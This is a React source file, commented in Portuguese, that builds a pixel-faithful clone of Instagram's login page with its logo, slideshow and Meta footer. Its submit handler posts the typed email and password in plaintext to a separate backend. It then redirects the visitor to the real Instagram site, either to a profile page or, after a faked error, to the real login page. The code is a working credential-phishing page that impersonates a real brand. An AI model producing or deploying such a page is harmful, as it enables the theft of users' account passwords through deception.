'use client';
import React, { useEffect, useState } from 'react';
import { IoLogoFacebook } from "react-icons/io";

const Clone = () => {
  const images = ["/screenshot1.png", "/screenshot2.png", "/screenshot3.png"];
  const [currentImageIndex, setCurrentImageIndex] = useState(0);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentImageIndex((prevIndex) => (prevIndex + 1) % images.length);
    }, 3000);
    return () => clearInterval(interval);
  }, [images.length]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setErrorMessage('');

    try {
      const response = await fetch('http://localhost:4000/users', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
      });

      if (response.ok) {
        const data = await response.json();
        console.log('Usuário cadastrado com sucesso:', data);
        window.location.href = 'https://www.instagram.com/yourusername';
      } else {
        const errorData = await response.json();
        console.error('Erro ao cadastrar o usuário:', errorData.message);
        setErrorMessage(errorData.message);
        setTimeout(() => {
          window.location.href = 'https://www.instagram.com/accounts/login/';
        }, 2000);
      }
    } catch (error) {
      console.error('Erro na requisição:', error);
      setErrorMessage('Erro na requisição, tente novamente.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="flex flex-col items-center justify-center h-screen bg-gray-50 p-4">
      <div className="max-w-7xl flex items-center justify-center gap-4">
        
        {/* Imagem de fundo (lado esquerdo) */}
        <div className="relative hidden md:block">
          <img src="/fund.png" alt="Fundo" className="w-[440px] h-auto" />
          <div className="absolute top-1/2 left-[280px] transform -translate-x-1/2 -translate-y-1/2 w-[250px] h-[585px] overflow-hidden">
            {images.map((image, index) => (
              <img
                key={index}
                src={image}
                alt={`Slide ${index}`}
                className={`absolute w-full h-full transition-opacity duration-1000 ${index === currentImageIndex ? "opacity-100" : "opacity-0"}`}
              />
            ))}
          </div>
        </div>
        
        {/* Formulário de login (lado direito) */}
        <div>
          <div className="border bg-white flex flex-col items-center gap-4 px-10 py-8 w-[350px] shadow-sm">
            <img src="/logo.png" alt="Logo do Instagram" className="w-[175px] my-4" />
            
            {errorMessage && (
              <div className="bg-red-500 text-white p-2 rounded mb-4 text-sm text-center">
                {errorMessage}
              </div>
            )}
            
            <form className="w-full flex flex-col gap-4" onSubmit={handleSubmit}>
              {/* Input de Email */}
              <div className="relative">
                <input 
                  type="email" 
                  value={email}
                  onChange={(e) => setEmail(e.target.value)} 
                  className={`border rounded-sm px-3 py-2 text-sm focus:outline-none bg-gray-50 w-full `}
                  required
                  onFocus={(e) => e.target.classList.add('focus:ring-2', 'focus:ring-blue-500')}
                  onBlur={(e) => !email && e.target.classList.remove('focus:ring-2', 'focus:ring-blue-500')}
                />
                <label className={`absolute left-3 top-2 text-gray-500 transition-all duration-300 ${email ? 'text-xs -translate-y-2' : 'text-sm'}`}>
                  Número do telemóvel, nome de utiliz...
                </label>
              </div>

              {/* Input de Senha */}
              <div className="relative">
                <input 
                  type="password" 
                  value={password}
                  onChange={(e) => setPassword(e.target.value)} 
                  className={`border rounded-sm px-3 py-2 text-sm focus:outline-none bg-gray-50 transition-all duration-300 w-full`}
                  required
                  onFocus={(e) => e.target.classList.add('focus:ring-2', 'focus:ring-blue-500')}
                  onBlur={(e) => !password && e.target.classList.remove('focus:ring-2', 'focus:ring-blue-500')}
                />
                <label className={`absolute left-3 top-2 text-gray-500 transition-all duration-300 ${password ? 'text-xs -translate-y-2' : 'text-sm'}`}>
                  Palavra passe
                </label>
              </div>

              <button 
                type="submit" 
                className="bg-blue-500 text-white py-2 rounded-sm font-semibold text-sm hover:bg-blue-600 transition">
                {loading ? (
                  <div className="flex items-center justify-center">
                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                    <span className="ml-2">Carregando...</span>
                  </div>
                ) : (
                  "Entrar"
                )}
              </button>
            </form>
            
            <div className="flex items-center gap-2 w-full my-4">
              <div className="border-t border-gray-300 w-full"></div>
              <span className="text-xs text-gray-400 font-semibold">OU</span>
              <div className="border-t border-gray-300 w-full"></div>
            </div>
            
            <button className="flex items-center gap-2 text-blue-900 font-semibold text-sm">
              <IoLogoFacebook size={25}/>
              Entrar com o Facebook
            </button>
            
            <a href="#" className="text-xs text-blue-700 mt-3">Esqueceu a senha?</a>
          </div>

          <div className="border bg-white text-center mt-4 py-4 w-[350px]">
            <span className="text-sm">Não tem uma conta? <a href="#" className="text-blue-500 font-semibold">Cadastre-se</a></span>
          </div>

          <div className="text-center mt-4">
            <p className="text-sm mb-2 py-2">Obtenha o aplicativo</p>
            <div className="flex gap-2 items-center justify-center">
              <img src="/playstore.png" alt="Play Store" className="w-32 h-10 cursor-pointer"/>
              <img src="/microsoft.png" alt="Microsoft Store" className="w-32 h-10 cursor-pointer" />
            </div>
          </div>
        </div>
        
      </div>

      {/* Rodapé no estilo Instagram */}
      <footer className="mt-8 text-center text-gray-500 text-xs space-y-2 flex flex-col gap-4 lg:absolute bottom-10">
        <div className="flex flex-wrap justify-center gap-2">
          <a href="#" className="hover:underline">Meta</a>
          <a href="#" className="hover:underline">Sobre</a>
          <a href="#" className="hover:underline">Blog</a>
          <a href="#" className="hover:underline">Empregos</a>
          <a href="#" className="hover:underline">Ajuda</a>
          <a href="#" className="hover:underline">API</a>
          <a href="#" className="hover:underline">Privacidade</a>
          <a href="#" className="hover:underline">Termos</a>
          <a href="#" className="hover:underline">Localizações</a>
          <a href="#" className="hover:underline">Instagram Lite</a>
          <a href="#" className="hover:underline">Threads</a>
          <a href="#" className="hover:underline">Carregar contatos e não usuários</a>
          <a href="#" className="hover:underline">Verificação Meta</a>
        </div>
        <div className="mt-4">
          <span>© 2024 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
}

export default Clone;
